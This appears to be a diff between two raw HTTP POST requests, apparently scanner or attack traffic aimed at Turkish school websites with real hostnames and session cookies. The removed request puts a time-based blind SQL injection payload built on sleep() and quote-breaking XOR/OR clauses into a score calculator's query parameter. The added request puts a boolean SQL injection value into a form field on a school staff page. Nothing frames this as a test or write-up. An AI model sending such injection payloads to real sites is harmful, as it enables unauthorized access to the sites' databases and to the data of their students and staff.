@@ -1,14 +1,12 @@
-
-POST /yntc/puan-hesap.php?tur=if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22X OR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/ HTTP/1.1
-Content-Length: 271
+POST /ugur-anadolu-lisesi-florya/akademik-kadro/anadil-bolumu?hata=1 HTTP/1.1
+Content-Length: 43
 Content-Type: application/x-www-form-urlencoded
 X-Requested-With: XMLHttpRequest
-Referer: http://okulpedia.okulsonuc.com:80/
-Cookie: PHPSESSID=se5siu7skpurl14ubq7pk0pg12
-Host: okulpedia.okulsonuc.com
+Cookie: PHPSESSID=6h8mvlgghq1033cu048pmodn10
+Host: www.ugurkoleji.com.tr
 Connection: Keep-alive
 Accept-Encoding: gzip,deflate
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
 Accept: */*
 
-hesapla=Hesapla&EDEBD=1&EDEBN=1&EDEBSS=40&EDEBY=1& FEND=1&FENN=1&FENSS=40&FENY=1&MATD=1&MATN=1&MATSS= 40&MATY=1&SOSD=1&SOSN=1&SOSSS=40&SOSY=1&TFEND=1&TF ENN=1&TFENSS=20&TFENY=1&TMATD=1&TMATN=1&TMATSS=40& TMATY=1&TSOSD=1&TSOSN=1&TSOSSS=20&TSOSY=1&TURD=1&T URN=1&TURSS=40&TURY=1
+brans=-1%27%20or%2032%20%3d%20%2730&gorev=0
